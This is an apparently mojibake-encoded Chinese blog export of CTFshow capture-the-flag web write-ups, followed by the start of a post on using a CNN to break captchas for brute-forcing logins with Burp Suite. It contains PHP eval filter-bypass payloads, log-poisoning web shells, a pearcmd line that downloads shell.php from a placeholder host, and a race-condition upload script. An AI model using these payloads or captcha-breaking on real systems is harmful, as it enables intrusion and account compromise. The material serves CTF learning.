<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æ­£åˆ™åŒ¹é…å¢åŠ äº†.å’Œï¼›ç¬¦å·ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½å†æ‹¼æ¥æ‰§è¡Œè¯­å¥äº†<br>
ä¸è¿‡è¿˜æœ‰ä¸¤ä¸ªå‘½ä»¤æ‰§è¡Œå‡½æ•°passthru()å’Œassert()å‡½æ•°</p>
<blockquote>
<p>passthru()ç›´æ¥å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨<br>
assert()ä¸­å¦‚æœæ˜¯å­—ç¬¦ä¸²ï¼Œä¼šå°†å…¶å½“ä½œphpä»£ç æ‰§è¡Œ</p>
</blockquote>
<p>ä½¿ç”¨passthru()<br>
åœ¨linuxä¸­ï¼Œåå¼•å·çš„ä½œç”¨æ˜¯å°†æ‰§è¡Œçš„å†…å®¹èµ‹äºˆå˜é‡ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;passthru(&#39;tac &#96;ls&#96;&#39;)?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web13/_A1DOADK%40Y2SY7~3A4N5_I5.png" alt=""><br>
ä½¿ç”¨assert()<br>
å› ä¸ºæ­£åˆ™è¡¨è¾¾å¼çš„è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯å°†system(â€˜tac config.phpâ€™)è¿›è¡Œbase64ç¼–ç æˆc3lzdGVtKCd0YWMgY29uZmlnLnBocCcp<br>
æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;assert(base64_decode(&#39;c3lzdGVtKCd0YWMgY29uZmlnLnBocCcp&#39;))?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web13/H3RUCLH9F2_HW%60%249J%5BWG5UO.png" alt=""><br>
çš†å¯è·å–åˆ°flag</p>
<h3 id="web14"><a class="header-anchor" href="#web14">Â¶</a>web14</h3>
<p>å¤ªå¯æ¶äº†ï¼Œè¿™æ¬¡å±…ç„¶è¿(ä¹Ÿç»™åŒ¹é…åˆ°äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸è¿‡æˆ‘è¿˜æœ‰å¦™è®¡ï¼Œåˆ©ç”¨å•å¼•å·è¿›è¡Œç»•è¿‡ï¼Œæ„é€ å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;tac conf&#39;&#39;ig?p&#39;&#39;hp&#96;?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web14/FI9QR%4026UGPQKOK%5BC%5DT6IN4.png" alt=""><br>
æˆåŠŸè·å–flag</p>
<h3 id="web15"><a class="header-anchor" href="#web15">Â¶</a>web15</h3>
<p>é˜¿å‘†åˆå‘ç–¯äº†ï¼Œè¿™æ¬¡æŠŠ&gt;ä¹Ÿç»™è¿‡æ»¤äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,$c))&#123;</span><br><span class="line">                <span class="keyword">eval</span>($c);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>ä¸è¿‡ï¼Œè¿™æ¬¡æˆ‘å†ç»™ä½ é‡æ‹³ä¸€å‡»ï¼Œç”¨æƒ¯äº†getï¼Œè¿™æ¬¡æˆ‘å°±ç”¨postæ‰“å¾—ä½ æ»¡åœ°æ‰¾ç‰™ï¼Œæ„é€ å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;echo &#96;$_POST[a]&#96;;</span><br><span class="line">postï¼ša&#x3D;tac config.php</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web15/EPV2W%29NLVEZ%254B%7DC%40J_Z_DR.png" alt=""><br>
è·å–åˆ°flag</p>
<h3 id="web16"><a class="header-anchor" href="#web16">Â¶</a>web16</h3>
<p>çœ‹ä¸€ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="string">&quot;ctfshow<span class="subst">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æŠŠè¿™ä¸²md5å»è§£ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web16/9%7DJEPAH%60O%24O62C7%29003%29S86.png" alt=""><br>
æ‰€ä»¥æˆ‘ä»¬å†æ„é€ æˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;36d</span><br></pre></td></tr></table></figure>
<p>å³å¯è·å¾—flag</p>
<h3 id="web17"><a class="header-anchor" href="#web17">Â¶</a>web17</h3>
<p>æ‰“å¼€é¢˜ç›®ï¼Œç»ˆäºæ¢ä¸€ä¸ªç³»åˆ—äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/8Z9%29%28_5UFERE%5DI6BQXG9%60PN.png" alt=""><br>
æŠŠphpéƒ½è¿‡æ»¤äº†QWQï¼ŒæŠ“åŒ…çœ‹çœ‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/%5BL%40GU%28%60N%4024QW%25%7B9%7D%25%7BZB4C.png" alt=""><br>
æ²¡å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œè¿™é‡Œçœ‹è§ç”¨çš„ä¸­é—´ä»¶æ˜¯nginxï¼Œé‚£å°±å»å°è¯•è¯»å–çœ‹ä¸€ä¸‹æ—¥å¿—ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æˆåŠŸ<br>
nginxé»˜è®¤æ—¥å¿—ä½ç½®ï¼š/var/log/nginx/access.log<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/AH%25%7DV5%5DVIC%7B4521~TR%29L12T.png" alt=""><br>
å‘ç°è¯»å–æˆåŠŸï¼Œé‚£å°±è¿›è¡Œæ—¥å¿—æ³¨å…¥ï¼Œå†æ¬¡æŠ“åŒ…ä¼ é©¬è¿‡å»<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/%40AD0VZ4X%60I%5B%242BE_%7BTK%28L%29P.png" alt=""><br>
ç”¨èšå‰‘è¿›è¡Œè¿æ¥<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/AA88TO%5BG%60%5BRE3%25CRTCQQPRV.png" alt=""><br>
è¿æ¥æˆåŠŸåï¼Œå†36d.phpæ–‡ä»¶ä¸­æ‰¾åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web17/TZ83A0AQ%2821%407%5D~%40C%60%295ZTS.png" alt=""></p>
<h3 id="web18-21"><a class="header-anchor" href="#web18-21">Â¶</a>web18-21</h3>
<p>ä½¿ç”¨web17çš„æ–¹æ³•éƒ½å¯ä»¥è§£å†³</p>
<h3 id="web22"><a class="header-anchor" href="#web22">Â¶</a>web22</h3>
<p>æ‰“å¼€ç¯å¢ƒï¼Œå‘ç°è¿™æ¬¡ä¼šåœ¨åé¢è‡ªåŠ¨åŠ ä¸Š.phpç»“å°¾<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/O%29LZC%5B%24T%408RQ3GU2WJ%4001GO.png" alt=""><br>
ç„¶åè¿™æ¬¡ç”¨æ—¥å¿—æ³¨å…¥çš„è¯ä¹Ÿè¡Œä¸é€šï¼Œå¯èƒ½ç»™çš„æƒé™ä¸å¤Ÿäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦å¯»å‡ºè·¯<br>
åœ¨ä½ç‰ˆæœ¬phpä¸­ï¼Œä¼šé»˜è®¤å¼€å¯ä¸€ä¸ªregister_argc_argvé…ç½®</p>
<blockquote>
<p>register_argc_argvæ˜¯é€šè¿‡GETè¯·æ±‚æ–¹æ³•ç±»ä¼¼äºå‚æ•°ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶ï¼Œ$argcæ˜¯ç”¨äºè®°å½•æ•°ç»„å¤§å°ï¼Œ$argvæ˜¯ç”¨äºè®°å½•è¾“å…¥çš„å‚æ•°</p>
</blockquote>
<p>è¿™é‡Œç”¨â€œ+â€å·è¿›è¡Œåˆ†å‰²ï¼Œå°±å¯ä»¥æ“çºµargvçš„å‚æ•°ä¸ªæ•°<br>
é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå»ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œå…ˆç”¨phpinfoæµ‹è¯•èƒ½ä¸èƒ½æˆåŠŸ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/7Y8BM%60%25B7%5B%5BX2R6UERMOCND.png" alt=""><br>
ç„¶åå¼€å§‹æ„é€ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;pearcmd&amp;+download+http:&#x2F;xx.xx.xx.xx&#x2F;shell.php</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/5OLUOC%2932B_%24PXP69O9DWNQ.png" alt=""><br>
ç„¶åå†è®¿é—®<code>http://41b52ef5-6be1-4210-a42c-cab5937677a7.chall.ctf.show/shell.php</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/%5BJJ%7BKC%28%28%5D%60%60K~~5OE72C2CI.png" alt=""><br>
å‘ç°èƒ½æˆåŠŸè®¿é—®ğŸ˜<br>
é‚£æˆ‘ä»¬å†æŠŠshell.phpå†…å®¹æ”¹ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/U0BUPFME%5DO2M7AY%40P8MXSFC.png" alt=""><br>
å†è¯·æ±‚ä¸€æ¬¡ï¼Œç„¶åè®¿é—®shell.phpï¼Œçœ‹åˆ°æ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/~%28IZ5SOVV%25O4TM%24D%28SIFW7C.png" alt=""><br>
é‚£æˆ‘ä»¬ç›´æ¥æŠŠshell.phpç›´æ¥æ”¹æˆ<code>tac 36d.php</code>ï¼Œç„¶åå°±èƒ½æ‹¿åˆ°flagäº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web22/J%24RG%7DA~%5B6G8PHJY5J~8S9U0.png" alt=""></p>
<h3 id="web23"><a class="header-anchor" href="#web23">Â¶</a>web23</h3>
<p>æ‰“å¼€ç½‘ç«™ï¼Œå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/76A%2573%5D%606L7W%280%7BW6_JC72S.png" alt=""><br>
ç›´æ¥æŠ“åŒ…ä¼ ä¸ªä¸€å¥è¯æœ¨é©¬è¯•è¯•<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/%60TEP_COCU%25MO%5BKYCHFIROKC.png" alt=""><br>
å•Šè¿™ï¼Œä¸Šä¼ æˆåŠŸäº†~è¿™ä¹ˆç®€å•å—ï¼Œå“¼å“¼ï¼Œè®¿é—®ä¸€ä¸‹æˆ‘çš„é©¬å„¿ğŸ´<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/DVKE%4037%7DJY%60%7D7SMVD7%5BD7MI.png" alt=""><br>
403ï¼Ÿï¼Ÿå’‹ä¼šæ²¡æœ‰ï¼Œé‡æ–°ä¼ äº†å‡ æ¬¡ï¼Œå‘ç°è®¿é—®è¿˜æ˜¯403ï¼Œæ“¦ï¼Œä¸ä¼šæºç æœ‰ä¸ªåˆ é©¬åŠŸèƒ½å§ï¼Œä¸Šä¼ å°±ä¼šæŠŠæˆ‘çš„ğŸ´ç»™åˆ äº†ï¼Œé‚£æˆ‘å°±å†™ä¸ªè„šæœ¬ä¼ æ­»ä½ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Authorï¼šdota_st</span></span><br><span class="line"><span class="comment"># Date ï¼š2021/1/25 11:58</span></span><br><span class="line"><span class="comment"># Tool ï¼šPyCharm</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line">url = <span class="string">&quot;http://ad17eb37-7528-4ee4-bd09-6285147189e5.chall.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell_php</span>(<span class="params">fname</span>):</span></span><br><span class="line">    qingqiu = requests.get(url + <span class="string">&quot;uploads/&quot;</span> + fname + <span class="string">&quot;.php&quot;</span>, headers=&#123;<span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>&#125;)</span><br><span class="line">    result = qingqiu.text</span><br><span class="line">    <span class="keyword">if</span> (len(result) &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="string">&quot;404 Not Found&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result <span class="keyword">and</span> <span class="string">&quot;å®¹å™¨å·²è¿‡æœŸ&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> result):</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Thread_fun</span>(<span class="params">fun, *args</span>):</span></span><br><span class="line">    pool = threadpool.ThreadPool(<span class="number">7</span>)</span><br><span class="line">    requests = threadpool.makeRequests(fun, args)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> requests]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Thread_start</span>(<span class="params">fname</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">400</span>):</span><br><span class="line">        Thread_fun(shell_php, fname + str(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_php</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_data = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&quot;&lt;?php system(\&quot;ls ../\&quot;);?&gt;&quot;</span>)&#125;</span><br><span class="line">        r = requests.post(url+<span class="string">&quot;upload.php&quot;</span>, files=file_data, headers=&#123;<span class="string">&#x27;Connection&#x27;</span>:<span class="string">&#x27;close&#x27;</span>&#125;)</span><br><span class="line">        txt = r.text</span><br><span class="line">        print(<span class="string">&quot;uploaded:&quot;</span>, txt)</span><br><span class="line">        ts = int(time.mktime(time.strptime(txt[<span class="number">8</span>:<span class="number">22</span>], <span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)))</span><br><span class="line">        file_name = time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>, time.localtime(ts + <span class="number">1</span>))</span><br><span class="line">        Thread_start(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload_php()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/0T775A3%7DTRP4BR0%7DW%28_S%5BK0.png" alt=""><br>
çœ‹åˆ°ç›®å½•ä¸‹æœ‰flaghere0.txtï¼Œæˆ‘ä»¬æŠŠæºç ä¸­çš„<code>ls ../</code>æ”¹æˆ<code>tac ../flaghere0.txt</code>å³å¯ï¼Œç„¶åå†è¿è¡Œä¸€é<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/web23-24/%7DYAD%7BR7%245%7BTWMS3O%40AN6431.png" alt=""><br>
å¾—åˆ°flagğŸ˜</p>
<h3 id="web-24"><a class="header-anchor" href="#web-24">Â¶</a>web 24</h3>
<p>æŒ‰ç…§é¢˜ç›®æç¤ºæŠŠæºç ä¸­çš„éšæœºæ•°æ”¹æˆ(0,300)ï¼Œæ—¶é—´æ”¹æˆ3å³å¯ï¼Œè¿è¡Œå¾—åˆ°flag</p>
<h3 id="è·å¾—ç™¾åˆ†ä¹‹ç™¾çš„å¿«ä¹"><a class="header-anchor" href="#è·å¾—ç™¾åˆ†ä¹‹ç™¾çš„å¿«ä¹">Â¶</a>è·å¾—ç™¾åˆ†ä¹‹ç™¾çš„å¿«ä¹</h3>
<p>æ‰“å¼€é¢˜ç›®æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;hack!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//by Firebasky</span></span><br><span class="line"><span class="comment">//by Firebasky </span></span><br></pre></td></tr></table></figure>
<p>é™åˆ¶é•¿åº¦ä¸º4ä»¥ä¸‹çš„å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬å…ˆæ„æˆ<code>?1=ls</code>æŸ¥çœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆæ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/EO%60%5BGUYLPTKYUYEWAL4E%289D.png" alt=""><br>
å‘ç°æ–‡ä»¶åæœ‰så’Œzå¼€å¤´çš„ï¼Œæƒ³åˆ°æœ€çŸ­çš„å‘½ä»¤å°±æ˜¯nlå‘½ä»¤ï¼Œnlå¯ä»¥è¾“å‡ºæ–‡ä»¶å†…å®¹å’Œè¡Œå·ï¼Œé‚£åªæœ‰ä¸‰ä¸ªå­—ç¬¦é•¿åº¦å¦‚ä½•è¯»å–secretsecret_ctfshow_36dddddddddd.phpä¸­çš„flagå‘¢ï¼Ÿ<br>
æˆ‘ä»¬å…ˆå»kalièµ°ä¸€éï¼Œè¯´è¯´åŸç†ï¼š<br>
é¦–å…ˆä½¿ç”¨&gt;å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨<code>&gt;s</code>ç”Ÿæˆä¸€ä¸ªç©ºçš„æ–‡ä»¶åä¸ºsçš„æ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/0%5BVI%6065%7BCX434Q_~DFS893O.png" alt=""><br>
ç„¶åå¾€sä¸­å†™å…¥abcä¸‰ä¸ªå­—ç¬¦åï¼Œä½¿ç”¨<code>nl s</code>è¾“å‡ºè¯•è¯•ï¼Œè¾“å‡ºç»“æœä¸ºå¸¦è¡Œå·çš„sæ–‡ä»¶å†…å®¹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/Y8AL~V%7BFZQ5%25%5B%7B8R5R6Y%243U.png" alt=""><br>
æˆ‘ä»¬å†ä½¿ç”¨<code>&gt;nl</code>ç”Ÿæˆnlä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨<code>*</code>é€šé…ç¬¦<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/ME%25%28LK%256E%60Q%7BN_LGN2J3_JV.png" alt=""><br>
å‘ç°ä¼šæŠŠabcçš„æ–‡ä»¶å†…å®¹ä¹Ÿè¯»å–æˆåŠŸäº†ï¼Œè¿™æ˜¯å› ä¸º*ä¼šæŠŠlså‡ºæ¥çš„ä¸€ä¸²æ–‡ä»¶åæŒ‰lsçš„é¡ºåºè¯»å–æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åå½“åšå‘½ä»¤æ‰§è¡Œï¼Œä¹Ÿå°±å˜æˆäº†&quot;nl s&quot;ï¼Œå˜æˆäº†ä¸€ä¸ªnlå‘½ä»¤<br>
æ‰€ä»¥è¿™é“é¢˜çš„pyloadä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;&gt;nl</span><br><span class="line">?1&#x3D;*</span><br><span class="line">#è¿˜æœ‰å¦ä¸€ä¸ªå‘½ä»¤odï¼ˆå…«è¿›åˆ¶è¾“å‡ºï¼‰ä¹Ÿæ˜¯å¯ä»¥çš„</span><br></pre></td></tr></table></figure>
<p>ç„¶åå†æºç ä¸­å°±å¯ä»¥çœ‹åˆ°flagäº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E4%B9%8B%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90/%24NA%24%7B4AR%7BMGLJT3%24JG~08%5DE.png" alt=""></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>å·ç§¯ç¥ç»ç½‘ç»œç»“åˆburpsuiteå®ç°æ¸—é€æµ‹è¯•ä¸­çš„éªŒè¯ç çˆ†ç ´</title>
    <url>/posts/37998/</url>
    <content><![CDATA[<h1>å‰è¨€</h1>
<p>é¦–å…ˆï¼Œåœ¨è¿™é‡Œè¦æ„Ÿè°¢c0ny1å¸ˆå‚…å¼€å‘çš„captcha-killeræ’ä»¶å’ŒNick liå¤§ä½¬çš„å¼€æºé¡¹ç›®ï¼Œè¿˜æœ‰miniboomå¸ˆå‚…æä¾›çš„æ€è·¯<br>
åœ¨å¹³æ—¶æˆ‘ä»¬è¿›è¡Œæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œå¸¸å¸¸ä¼šé‡åˆ°ä¸‹é¢è¿™ç§æƒ…å†µ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
åœ¨ç½‘ç«™çš„éªŒè¯ç æ— æ³•ç»•è¿‡çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆéœ€è¦è¿›è¡Œç½‘ç«™çš„çˆ†ç ´ï¼Œä½†çˆ†ç ´å¾—å¡«å†™æ­£ç¡®çš„éªŒè¯ç è¿›è¡Œä¸€ä¸ªè®¤è¯ï¼Œè¿™ç§æƒ…å†µä¸‹å¯èƒ½ä¼šåŠé€€éƒ¨åˆ†å°ä¼™ä¼´ä»¬ï¼Œè¿™ä¸ªæ—¶å€™å¦‚ä½•å¤„ç†è¿™ç§é—®é¢˜æˆä¸ºäº†ä¸€ä¸ªå€¼å¾—æ¢è®¨çš„ç‚¹ã€‚<br>
çœ‹è¿‡å…¶ä»–å¸ˆå‚…çš„æ€è·¯ï¼Œåœ¨è¿™é‡Œæœ‰ä¸€ä¸ªæœ‰æ•ˆçš„åŠæ³•ï¼Œå°±æ˜¯é‡‡ç”¨æ·±åº¦å­¦ä¹ çš„å·ç§¯ç¥ç»ç½‘ç»œå¯¹éªŒè¯ç è¿›è¡Œè®­ç»ƒè¯†åˆ«ï¼Œç„¶åå»ºç«‹æ¨¡å‹ï¼Œè°ƒç”¨burpsuiteçš„æ’ä»¶captcha-killerè·å–è¯†åˆ«æ¥å£è¿›è¡Œçˆ†ç ´ã€‚</p>
<h1>å®‰è£…</h1>
<h2 id="cnn-captchaçš„å®‰è£…å’Œä½¿ç”¨"><a class="header-anchor" href="#cnn-captchaçš„å®‰è£…å’Œä½¿ç”¨">Â¶</a>cnn_captchaçš„å®‰è£…å’Œä½¿ç”¨</h2>
<h3 id="é¡¹ç›®å®‰è£…åŠç¯å¢ƒå‡†å¤‡"><a class="header-anchor" href="#é¡¹ç›®å®‰è£…åŠç¯å¢ƒå‡†å¤‡">Â¶</a>é¡¹ç›®å®‰è£…åŠç¯å¢ƒå‡†å¤‡</h3>
<p>é¡¹ç›®ä¸ºäº†æ–¹ä¾¿å·²ç»è½¬åˆ°æˆ‘çš„githubçš„ä»“åº“ä¸Šï¼Œå¤§å®¶å¯ä»¥å»æˆ‘çš„ä»“åº“è¿›è¡Œä¸‹è½½</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">é¡¹ç›®åœ°å€ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;dota-st&#x2F;cnn_captcha</span><br></pre></td></tr></table></figure>
<p>é¡¹ç›®ä»‹ç»ï¼š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%24QG3%40MNR4O%7DTVAZ%28Y748AU8.png" alt=""></p>
